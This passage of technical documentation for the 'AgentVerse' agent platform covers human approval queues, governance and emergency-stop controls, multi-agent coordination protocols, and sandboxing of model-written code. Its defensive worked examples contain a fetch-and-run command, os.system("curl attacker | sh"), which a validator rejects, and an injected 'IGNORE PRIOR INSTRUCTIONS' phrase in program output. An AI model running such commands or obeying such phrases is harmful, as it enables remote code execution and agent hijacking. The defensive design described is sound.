  • SSE without reconnect. A dropped stream losing the live view.
  • No adaptive rendering. Raw JSON where a rendered result belongs.

Choose it when

  • Any goal a human should be able to watch or steer.

03Human-in-the-loop surfaces#

ShippedControlImpl9/10Criticality10/10

Where the abstract HITL gate becomes a button: a queue of pending approvals, each showing the proposed action, its arguments, and the evidence — enough to decide without reading the transcript.

Mechanism

The approval surface renders the HITL queue (chapter 1): each pending request shows the action, its exact arguments, why it was flagged, and the supporting evidence. Approving or denying resumes or fails the goal; the decision is recorded and the argument hash is compared at execution. A badge surfaces pending approvals across the console so nothing waits unseen. The same surface handles clarification requests — the agent asking a question rather than proposing an action.

In AgentVerse

  • agent-verse-frontend/src/features/approvals/the approval surface
  • agent-verse-frontend/src/components/ui/PendingApprovalsBadge.tsxthe always-visible badge
  • agent-verse-frontend/src/features/chat/chat + HITL surface
  • app/governance/hitl.pythe backend gateway
  • app/collaboration_runtime/clarification.pyclarification requests

Worked example

approval card
  action    file GSTR-1 amendment
  arguments period 2026-03, total ₹418,200, GSTIN 27AAAPZ…
  reason    write_high + regulated domain
  evidence  [the recomputed total, the filed return, the diff]
  [Approve]  [Deny]  [Ask a question]
badge shows "3 pending" across every page so none is missed

At production scale

The approval UX is where governance succeeds or fails operationally. Design it for the phone, because approval latency dominates gated-goal time (chapter 1); show enough to decide without opening the run; and make the pending badge impossible to ignore, because an unserviced approval queue is a silent outage (chapter 11). This surface is the concrete form of the platform's most important safety control.

Failure modes

  • Too little context. Forcing the approver to open the whole run.
  • Hidden queue. Approvals waiting unseen.
  • Desktop-only design. Approvers who are never at a desk.

Choose it when

  • Any platform with gated actions.

04Governance and emergency controls#

ShippedControlImpl8/10Criticality10/10

The operator's steering wheel and brake: policy management, budget dashboards, the audit trail, and an emergency stop that can halt a tenant's agents at once.

Mechanism

The governance page exposes the controls from chapter 13 as an interface: view and edit policies (with changes propagating fleet-wide via Redis, chapter 20), watch budgets and spend, read the hash-chained audit trail, and — critically — an emergency stop that halts execution for a tenant or the fleet when something is going wrong. The emergency stop is the control you hope never to use and must be able to reach instantly.

In AgentVerse

  • agent-verse-frontend/src/features/governance/policy, e-stop, budgets
  • agent-verse-frontend/src/features/audit/the audit trail view
  • agent-verse-frontend/src/features/security/, rbac/, compliance/security surfaces
  • agent-verse-frontend/src/lib/api/client.tsgovernanceApi
  • app/governance/*, app/policy_runtime/*the backend controls

Worked example

incident: a connector is returning bad data and agents are acting on it
 operator → governance page → emergency stop for tenant acme
 → all running goals pause, no new goals start
 → operator disables the connector (policy change propagates in seconds)
 → resumes
the audit trail records the stop, who, when, and why

At production scale

An emergency stop is the control that makes autonomous agents deployable at all — the ability to halt everything instantly is what lets you grant autonomy in the first place. Policy changes propagating in seconds (not on next deploy) is what makes the console a real steering wheel rather than a status display. These surfaces are the operational face of chapters 12–14.

Failure modes

  • No emergency stop. Nothing to pull when it goes wrong.
  • Policy changes needing a deploy. Too slow to matter in an incident.
  • Audit not surfaced. No operator view of what happened.

Choose it when

  • Any platform with autonomous or high-risk agents.

05Memory, agent, and observability inspection#

PartialInspectionImpl7/10Criticality7/10

The console makes the invisible visible: browse an agent's memory, watch its autonomy and reputation, and inspect the decision, RAG, and cost traces that explain its behaviour.

Mechanism

Inspection surfaces render the internal state the earlier chapters describe: a memory browser shows what an agent remembers and lets an operator review or quarantine (chapter 3); an autonomy control sets the tier (chapter 22); observability pages render the decision, RAG, and cost traces (chapter 11) so "why did it do that / cost that" is answerable in the UI, not just in logs. This is where the platform's observability becomes an operator tool rather than an engineer's query.

In AgentVerse

  • agent-verse-frontend/src/components/agent/MemoryBrowser.tsx, AutonomyControl.tsx, DiscoveryPanel.tsxagent inspection
  • agent-verse-frontend/src/features/observability/, eval/, eval-suites/traces and evals
  • agent-verse-frontend/src/features/memory/, knowledge/, knowledge-graph/memory and knowledge
  • agent-verse-frontend/src/components/org/OrgChart.tsx, KanbanBoard.tsxorg visualisation

Worked example

an agent behaves oddly
 operator → memory browser → finds a suspicious lesson → quarantines it
 → observability → decision trace shows the classifier scored it expert,
   so six reasoning patterns ran → explains the cost
 → autonomy control → drops the agent to supervised until reviewed
all in the console, no log queries

At production scale

Inspection surfaces are what let operators — not just engineers — run the platform. A memory browser that lets an operator quarantine a poisoned lesson, an autonomy control that lets them dial back a misbehaving agent, and trace views that explain cost and behaviour turn the rich internal state of the backend into something a human can actually steer. This is the payoff of building observability and memory as first-class, inspectable subsystems.

Failure modes

  • State only in logs. Operators dependent on engineers.
  • Read-only inspection. Seeing a problem but unable to act on it.

Choose it when

  • Operators, not just engineers, need to run the platform.

06The builder, lab, and playground#

PartialAuthoringImpl7/10Criticality6/10

Where humans create and test agents: a natural-language builder, a workflow canvas, and a playground to trial an agent before it touches production.

Mechanism

The builder turns a description into an agent configuration via the meta-agent (chapter 9), validated against real capabilities. The workflow builder is a visual canvas for composing deterministic workflows (chapter 20 templates). The lab and playground let an operator run an agent against test inputs, see the full trace, and iterate before promoting it — the authoring counterpart to the certification gate (chapter 10).

In AgentVerse

  • agent-verse-frontend/src/features/builder/, lab/, playground/authoring and testing
  • agent-verse-frontend/src/features/workflow-builder/, workflow-engine/visual workflow canvas
  • agent-verse-frontend/src/features/templates/, marketplace/starting from templates
  • app/api/builder.py, lab.pythe backend surfaces

Worked example

builder: "an agent that reconciles vendor invoices monthly"
 → meta-agent proposes config → validated against acme's tools/collections
 → operator opens it in the lab → runs against last month's data
 → inspects the full trace → adjusts the threshold → certifies → promotes
create, test, and gate before a single real invoice is touched

At production scale

The builder and playground are what let non-engineers create agents safely — the meta-agent proposes, the human reviews, the lab tests, and certification gates. The workflow canvas serves the deterministic end of the spectrum where a fixed process is preferable to an autonomous agent. Together they make the platform authorable without making it dangerous, provided the certification gate is real.

Failure modes

  • Promote without testing. An agent reaching production untested.
  • Generated config auto-activated. No human review (chapter 9).

Choose it when

  • Non-engineers create agents, or workflows need visual authoring.

What is missing here

  • Mobile-first approval. The approval surface exists, but a genuinely mobile approval experience (the phone is where approvers are) is thinner than the desktop console.
  • Operator-facing cost attribution. Traces are rich; a tenant-facing "where your spend goes" breakdown per goal class is less developed (chapter 11).
  • In-console trajectory diffing. No UI to compare a working and a failing run of the same goal side by side.
  • Collaborative steering. The WebSocket collaboration layer exists; multi-operator steering of the same goal with presence and conflict handling is early.

Coordination protocols

Magentic, group chat, swarm, auction, CAMEL, MoA, handoffs, A2A.

Concepts
8
Mean impl
6.8
Mean criticality
5.2
Shipped
1
Thin / missing
0

Orientation

Chapter 1 covered the multi-agent patterns that run inside one goal. This chapter is about the coordination protocols underneath them — the durable, event-sourced machinery that lets agents negotiate, hand off, converge, and bid over time, with state that survives restarts and a transcript that can be replayed. These are the primitives that turn "several agents in a loop" into a governed multi-agent system.

The unifying design is event-sourced coordination: each protocol is a state machine whose transitions are recorded, so coordination is durable (survives a worker dying), auditable (every decision is in the ledger), and replayable (you can reconstruct exactly what happened). Each protocol below is one answer to "how do multiple agents agree on something".

The protocols

01The coordination substrate#

ShippedFoundationImpl8/10Criticality7/10

A shared service, contracts, store, and state machines that every coordination protocol builds on — event-sourced, tenant-scoped, and replayable.

Mechanism

The coordination service provides the common machinery: typed contracts for coordination messages, a durable store, state machines, streaming, an outbox for reliable delivery, and replay. Each protocol (magentic, group chat, swarm, auction…) is an adapter over this substrate, so they share persistence, audit, and cross-replica delivery rather than each reinventing it.

In AgentVerse

  • app/coordination/service.pyCoordinationService
  • app/coordination/contracts.py, store.py, state_machines.py, state_repository.pythe substrate
  • app/coordination/outbox.py, streaming.py, streams.pyreliable delivery + streaming
  • app/coordination/replay.py, read_models.pyreplay and projections
  • app/coordination/transcript/*the transcript service and projections

Worked example

a coordination session (any protocol)
 messages recorded as events in the store (tenant-scoped)
 state machine advances on each event
 outbox guarantees delivery across replicas
 transcript projection → a readable record → replayable for audit

At production scale

Event-sourcing coordination is what makes multi-agent systems debuggable at all. When a negotiation produces a strange outcome, the transcript is the only artifact that explains it, and replay lets you reconstruct it exactly. Building the substrate once means every protocol inherits durability and audit.

Failure modes

  • Coordination state in memory. Lost on restart, unauditable.
  • No transcript. Outcomes that cannot be explained.

Choose it when

  • Any durable multi-agent coordination.

02Magentic: ledger-driven orchestration#

PartialProtocolImpl7/10Criticality6/10

A supervisor protocol with a task ledger: the orchestrator tracks progress against a plan, detects stalls, evaluates progress, and replans — a durable, auditable version of the supervisor pattern.

Mechanism

Magentic maintains a ledger of the plan and its revisions. A progress evaluator judges whether the team is advancing; a stall detector catches lack of progress; a replan manager revises the plan (recording a ledger revision); a participant policy governs who acts; and human review can be inserted. It is the supervisor pattern (chapter 1) made durable and event-sourced.

In AgentVerse

  • app/coordination/magentic/adapter.pythe protocol adapter
  • app/coordination/magentic/progress_evaluator.py, stall_detector.pyprogress and stall
  • app/coordination/magentic/replan_manager.py, participant_policy.pyreplan and participation
  • app/coordination/magentic/human_review.py, models.pyhuman review
  • app/coordination/ledger/*LedgerRevision — the task ledger

Worked example

magentic session, goal "resolve the incident"
 ledger v1: [gather metrics, diff deploys, analyse queries, remediate]
 progress evaluator: steps 1-2 done, step 3 stalled (same result 3×)
 stall detector fires → replan manager → ledger v2 (new approach for step 3)
 all revisions recorded → replayable, auditable

At production scale

Magentic's value over the plain supervisor pattern is durability and the explicit stall/progress machinery — a long-running multi-agent goal survives restarts and cannot silently spin. The ledger is the audit artifact that explains why the plan changed. Reserve it for goals long or complex enough to justify the coordination overhead.

Failure modes

  • Weak progress signal. A stall not detected, or false stalls.
  • Unbounded replanning. Ledger revisions without a cap.

Choose it when

  • Long, complex multi-agent goals needing durable orchestration.

03Group chat#

PartialProtocolImpl7/10Criticality5/10

Multiple agents in a shared conversation, with a speaker policy deciding who talks next and compaction keeping the transcript within budget.

Mechanism

Agents share a conversation; a speaker policy (round-robin, or a selector that picks the most relevant next speaker) governs turn-taking, preventing the free-for-all that makes group chat incoherent. A state machine tracks the conversation; compaction summarises old turns so a long discussion stays within the context budget (chapter 8).

In AgentVerse

  • app/coordination/group_chat/adapter.py, state_machine.pythe protocol
  • app/coordination/group_chat/speaker_policy.pyturn-taking
  • app/coordination/group_chat/compaction.pytranscript compaction
  • app/api/coordination_group_chat.pythe API

Worked example

group chat: architect, security, cost agents discuss a design
 speaker policy: relevance-based → security speaks when risk is raised
 compaction: after 40 turns, older turns summarised to stay in budget
 outcome: a design with all three perspectives, in one transcript

At production scale

Group chat is useful for genuinely multi-perspective deliberation but expensive (every agent reads every turn) and prone to incoherence without a good speaker policy. The compaction is essential — an uncompacted group chat hits the context limit fast. Prefer a supervisor or debate protocol unless the value is specifically in the open conversation.

Failure modes

  • No speaker policy. Incoherent free-for-all.
  • No compaction. Context overflow.
  • Cost blowout. Every agent reading every turn.

Choose it when

  • Multi-perspective deliberation where the conversation itself is the value.

04Handoffs#

PartialProtocolImpl7/10Criticality6/10

An agent explicitly transfers control to another, with membership and a state machine governing the handoff — the "escalate to a specialist" pattern, made durable.

Mechanism

An agent decides a task belongs to another and hands off, passing a compact brief. Membership governs who can receive a handoff; a state machine tracks the transfer so control is never lost or duplicated. The receiving agent inherits the necessary context but not more than its scope allows (chapter 14).

In AgentVerse

  • app/coordination/handoffs/service.py, state_machine.pythe protocol
  • app/coordination/handoffs/membership.py, models.py, repository.pymembership and state
  • app/api/coordination_handoffs.pythe API

Worked example

support-agent handles a ticket → recognises it needs billing expertise
 → handoff to billing-agent with a brief (not the whole transcript)
 → state machine: control transferred, support-agent no longer acting
 → billing-agent resolves, control returns or closes

At production scale

Handoffs are the clean way to compose specialists without a supervisor overhead — each agent does what it is good at and passes on the rest. The state machine matters: without it, a handoff can leave control ambiguous (both agents acting) or lost (neither acting). Pass a brief, not the whole history, to keep the receiving agent's context focused.

Failure modes

  • Control ambiguity. Both or neither agent acting.
  • Context dump. The whole transcript handed over.
  • Handoff loops. Two agents bouncing a task.

Choose it when

  • Work moves cleanly between specialists.

05Swarm and mixture-of-agents#

PartialProtocolImpl6/10Criticality4/10

Two decentralised protocols: a swarm where agents claim work and converge via gossip, and mixture-of-agents where layers of agents refine a proposal with diversity and quorum.

Mechanism

Swarm: agents claim tasks from a shared pool, share state via gossip, and converge without a central coordinator — resilient but harder to reason about. Mixture-of-agents (MoA): several agents propose independently, then layers of aggregator agents refine, with a diversity policy ensuring the proposals differ and a quorum deciding acceptance. Both trade central control for parallelism or diversity.

In AgentVerse

  • app/coordination/swarm/*claims, convergence, gossip
  • app/coordination/moa/aggregator.py, layer_planner.py, diversity_policy.py, quorum.pyMoA aggregation
  • app/api/coordination_swarm.py, coordination_moa.pythe APIs

Worked example

MoA on a hard question
 layer 1: 4 agents propose independently (diversity policy enforces difference)
 layer 2: 2 aggregators refine the proposals
 quorum: accept when 2 of 2 agree → a stronger answer than any single agent
swarm on a large task pool: agents claim, gossip progress, converge

At production scale

Rated low on criticality because both are specialised: swarm suits large, parallelisable task pools where central coordination is a bottleneck; MoA suits hard questions where diverse refinement beats a single strong model. For most production work a supervisor or debate protocol is more predictable and cheaper. Use these where their specific shape — decentralisation or diverse aggregation — is genuinely needed.

Failure modes

  • Swarm non-convergence. Agents never agreeing.
  • MoA fake diversity. Proposals that agree because they are similar.
  • Cost. Many agents, high spend.

Choose it when

  • Large parallel pools (swarm) or hard questions needing diverse refinement (MoA).

06Auction-based allocation#

PartialProtocolImpl6/10Criticality4/10

Agents bid for tasks; a sealed-bid auction allocates work to the best-fit agent, with fairness and threat detection — a market mechanism for task assignment.

Mechanism

Tasks are auctioned; agents submit sealed bids reflecting their fit and capacity; an allocator assigns based on scoring, with a fairness policy preventing one agent from winning everything and threat detection catching manipulation. It is an alternative to the router (chapter 1) for task allocation — a market rather than a scorer — useful when agents have genuine capacity constraints.

In AgentVerse

  • app/coordination/auction/sealed_bids.py, allocator.py, scoring.pythe auction
  • app/coordination/auction/fairness.py, threat_detection.pyfairness and anti-manipulation
  • app/coordination/auction/state_machine.py, models.pystate
  • app/api/coordination_auction.pythe API

Worked example

task pool auctioned across a team
 agents bid (fit × available capacity)
 sealed bids → allocator assigns → fairness policy caps any one winner
 threat detection: an agent bidding to starve others → flagged

At production scale

Auctions are a specialised allocation mechanism — most task assignment is better served by the router's multi-signal scoring (chapter 1). Auctions earn their place when agents have real, differing capacity and a market clears it better than a central scorer. The fairness and threat-detection machinery signals the concern: any market invites gaming.

Failure modes

  • Bid gaming. Agents manipulating the market.
  • Unfair concentration. One agent winning everything.
  • Overhead. Auction cost exceeding the allocation benefit.

Choose it when

  • Agents have genuine capacity constraints a market clears well.

07CAMEL role-play and generative agents#

PartialProtocolImpl6/10Criticality4/10

Two more specialised protocols: CAMEL pairs a role-playing "user" and "assistant" agent to drive a task through inception prompting, and generative agents simulate personas with memory, observation, reflection, and a simulation clock.

Mechanism

CAMEL: two agents role-play (a task-giver and a task-doer) with an inception prompt setting up the collaboration, useful for autonomous task completion through dialogue, bounded by a termination condition. Generative agents: personas with observation, memory, reflection, and a simulation clock — the "believable agents" research direction, for simulation rather than production tasks.

In AgentVerse

  • app/coordination/camel/inception.py, adapter.py, termination.pyCAMEL role-play
  • app/coordination/generative/persona.py, observation.py, reflection.py, simulation_clock.pygenerative agents
  • app/api/coordination_camel.py, coordination_generative.pythe APIs

Worked example

CAMEL: "user" agent gives sub-tasks, "assistant" agent executes, dialogue
 continues until the termination condition → autonomous completion
generative: personas observe a simulated environment, form memories, reflect,
 and act on a simulation clock → a believable-behaviour sandbox

At production scale

Both are research-leaning. CAMEL's role-play can drive some autonomous tasks but is less controllable than plan-execute; generative agents are for simulation (testing how a population of agents behaves) rather than production work. They are included because they are real, distinct protocols in the platform — and because a complete map of coordination should name the experimental corners honestly, not just the production ones.

Failure modes

  • CAMEL non-termination. Role-play that never ends.
  • Generative drift. Personas behaving unpredictably.

Choose it when

  • CAMEL for dialogue-driven autonomous tasks; generative for simulation.
  • Not for controllable production work — use plan-execute or supervisor.

08Agent-to-agent (A2A) communication#

PartialProtocolImpl7/10Criticality6/10

The protocol for agents calling agents — across the same tenant or federated across platforms — with the security and dispatch machinery to make it safe.

Mechanism

A2A lets one agent invoke another as a capability, over MCP (chapter 20). Within a tenant it is a scoped call inheriting the caller's constraints; across platforms it is a federated call with its own security (a2a_security) and dispatch. It is how agents compose into larger systems — an agent using another agent as a tool — with the same validation and risk classification as any other tool call.

In AgentVerse

  • app/mcp/a2a.py, app/agent/tools/a2a_call.pyA2A over MCP
  • app/civilization/a2a_dispatch.py, a2a_repository.py, a2a_security.pydispatch and security
  • app/api/a2a.pythe API

Worked example

agent A needs a specialised analysis agent B provides
 A calls B via a2a_call (an MCP tool) with a scoped brief
 B runs as itself, within its own scope, returns a result
 the call is validated, risk-classified, and audited like any tool call

At production scale

A2A is how agents become composable building blocks — but it inherits every risk of tool calling plus the risk of an agent as an untrusted caller. Treat an A2A call like any external tool: validate, scope, classify risk, audit. Federated A2A (across platforms) needs its own trust model, which is why a2a_security is a distinct concern.

Failure modes

  • Unscoped A2A. A called agent exceeding the caller's scope.
  • A2A loops. Agents calling each other cyclically.
  • Federated trust gaps. Trusting a remote agent's output.

Choose it when

  • Agents compose into larger systems as capabilities.

What is missing here

  • Protocol selection guidance in the assembler. The pattern assembler picks single-agent patterns; choosing among coordination protocols for a multi-agent goal is more manual.
  • Cross-protocol composition. Running, say, a handoff inside a magentic session is possible but not a first-class composition.
  • Coordination eval. Individual agents and teams are evaluated; the effectiveness of a coordination protocol as such is not systematically measured.
  • Federated A2A trust framework. Cross-platform agent calls need a maturer trust and reputation model.

CH 25VII · Not on the list

Code execution & sandboxing

Running model-written code without giving away the cluster.

Concepts
4
Mean impl
7.8
Mean criticality
9.0
Shipped
3
Thin / missing
0

Orientation

Letting an agent run code it wrote is the highest-leverage and highest-risk capability in the platform. High-leverage because one program can do what twenty tool calls cannot — join, aggregate, transform data at machine speed (chapter 1, code-as-action). High-risk because model-written code is untrusted code, and running untrusted code is the oldest security problem there is.

The whole discipline reduces to one principle: the sandbox must assume the code is hostile. Not "probably fine" — hostile. Every control below (static validation, isolation, no ambient credentials, egress denial, resource caps, output sanitisation) exists because any one of them failing alone should not give away the cluster.

The sandbox

01Static code validation#

ShippedDefenceImpl8/10Criticality10/10

Before execution, inspect the code: which imports, which syscalls, which resources — and reject anything outside an allowlist. A filter, not the boundary.

Mechanism

The validator parses the generated code and checks it against a policy: allowed imports, forbidden operations (network, filesystem outside a workspace, subprocess), and resource declarations. It rejects obvious danger before the code runs — but it is explicitly a filter, because dynamic construction can evade static analysis, which is why isolation (below) is the real boundary.

In AgentVerse

  • app/execution_environment/code_validation.pyCodeWorkloadValidator
  • app/execution_environment/python_policy.pyallowed operations
  • app/execution_environment/models.pyCodeExecutionWorkload, CodeExecutionObservation
  • app/agent/patterns/codeact.py, program_of_thought.pythe callers (chapter 1)

Worked example

generated  import pandas; df = load_csv(...); print(df.duplicated().sum())
validate   pandas allowed · no network · no fs writes outside /tmp/work · ok
generated  import os; os.system("curl attacker | sh")
validate   os.system + network → REJECTED before execution

At production scale

Static validation catches the easy cases cheaply and gives you an audit record of what was rejected. But never rely on it as the boundary — a determined payload builds the dangerous call dynamically. Its job is to reduce what reaches the sandbox, not to be the sandbox. Full context in chapter 1's code-as-action concept.

Failure modes

  • Validation as the only defence. Evadable by dynamic construction.
  • Allowlist too broad. Dangerous imports permitted.

Choose it when

  • Always, as the first filter — never as the only one.

02Isolated execution runners#

ShippedDefenceImpl8/10Criticality10/10

The real boundary: code runs in an isolated worker — local sandbox or Kubernetes pod — with no ambient credentials, denied egress, and hard resource caps.

Mechanism

The runner executes the validated code in isolation, with a filesystem policy (writes confined to a workspace), a network policy (egress denied by default), CPU/memory/time caps, and — critically — no credentials in the environment. Multiple runner backends (local for dev, Kubernetes for production, a fake for tests) implement one interface. The isolation is the boundary that makes a validation miss survivable.

In AgentVerse

  • app/execution_environment/local_runner.py, kubernetes_runner.py, fake_runner.pyrunner backends
  • app/execution_environment/runner_client.py, code_worker.py, worker_entrypoint.pythe runner interface and worker
  • app/sandbox_runtime/filesystem_policy.py, network_policy.py, profile.pythe sandbox policies
  • app/execution_environment/policy.py, scheduler.py, health.pypolicy, scheduling, health

Worked example

runner executes the dedup program
 filesystem  writes only to /tmp/work
 network     egress denied (the code cannot phone home)
 resources   cpu 2s, mem 512MB, wall 5s
 credentials NONE in the environment
even if the code were malicious, it has nothing to steal and nowhere to send

At production scale

Run the sandbox as its own workload class with its own autoscaling — code execution is CPU/GPU-bound and bursty while agent workers are IO-bound, and mixing them makes both scale badly (chapter 32). The no-credentials rule is the single most important control: an agent that needs data should be handed the data (fetched by a governed tool) rather than the credentials to fetch it, so the sandbox never holds a secret.

Failure modes

  • Credentials in the sandbox. The catastrophic mistake.
  • Egress allowed by default. Exfiltration path.
  • No resource caps. A crypto-miner or a fork bomb.

Choose it when

  • Always, if you run model-written code at all.

03Observation sanitisation and the envelope#

ShippedDefenceImpl8/10Criticality9/10

What comes back from the sandbox is untrusted: truncate it, redact it, mark it, and never let a program's output flood the context or smuggle an instruction.

Mechanism

The runner returns an observation envelope; a sanitizer truncates large output (keeping head and tail with a marker), redacts anything sensitive, and marks the whole as untrusted before it reaches the model. Large results are returned as artifacts by reference rather than inline (chapter 8). This closes the loop safely: the program did the work, but its output cannot overflow the window or act as an injection vector.

In AgentVerse

  • app/execution_environment/observation_sanitizer.pysanitisation
  • app/execution_environment/envelope.py, events.pythe observation envelope
  • app/execution_environment/artifacts.pylarge output by reference
  • app/agent/exfil_guard.pyuntrusted marking (chapter 12)

Worked example

program prints a 40MB table + "IGNORE PRIOR INSTRUCTIONS..."
 sanitizer: truncate to head+tail (marker "[truncated 39.9MB]")
            full table stored as artifact a-91
            output marked untrusted → the injection cannot become an instruction
model sees a bounded, marked observation + an artifact reference

At production scale

Silent truncation is the subtle bug: a program prints partial results, the sanitizer cuts them, and the model concludes from a fragment believing it is whole — so the truncation must be marked. Returning large output as artifacts keeps both the context and the cost bounded. And marking output untrusted is the same discipline as tool output (chapter 12): the sandbox is just another source of untrusted content.

Failure modes

  • Silent truncation. Reasoning over a fragment as if whole.
  • Output trusted. An injection from the program's own output.
  • Unbounded inline output. Context and cost blowout.

Choose it when

  • Always, between the sandbox and the model.

04Sandbox simulation and certification#

PartialTestingImpl7/10Criticality7/10

Before a code-capable strategy or a connector runs for real, exercise it in a simulated sandbox — mock tools, no real side effects — to certify it behaves safely.

Mechanism

A simulation runner executes a strategy or trajectory against mock tools and a sandboxed environment, so its behaviour can be observed without real side effects — the mock-tool sandbox of chapter 31. Certification runs this before promotion: a code-capable strategy must demonstrate it stays within policy under simulation before it is allowed near real systems. It is the testing counterpart to the runtime isolation.

In AgentVerse

  • app/sandbox_runtime/simulation_runner.py, certification.py, sandbox_trace.pysimulation and certification
  • app/enterprise/simulation.pythe mock-tool sandbox (chapter 31)
  • app/mcp/certification.pyconnector certification via mocked probes

Worked example

a new code-capable strategy
 simulation runner: run it against mock tools, sandboxed
 observe: does it attempt egress? exceed caps? call forbidden tools?
 certification: passes policy under simulation → cleared for real use
 → uncertified strategies stay in the sandbox

At production scale

Simulation-then-certification is how you offer a catalogue of code-capable strategies safely: each is proven under mock conditions before it touches real systems. The sandbox trace is the evidence. This connects to the broader certification story (chapter 10) — a code-capable strategy is exactly the kind of thing that must be gated behind evidence, not trust.

Failure modes

  • Certification without simulation. A paper exercise.
  • Mocks that diverge from reality. Passing simulation, failing in production.

Choose it when

  • Any code-capable strategy or connector before production use.

What is missing here

  • Hardware-level isolation options. The runners isolate at the process/pod level; stronger isolation (microVMs, gVisor) for the highest-risk tenants is future work.
  • Language breadth. The policy machinery centres on Python; other languages would need their own validators and policies.
  • Deterministic replay of executions. Non-determinism (clock, randomness) makes a code execution hard to replay exactly for audit.
  • Egress allowlisting. Egress is denied by default; a governed allowlist for the rare case a program legitimately needs a specific endpoint is thin.
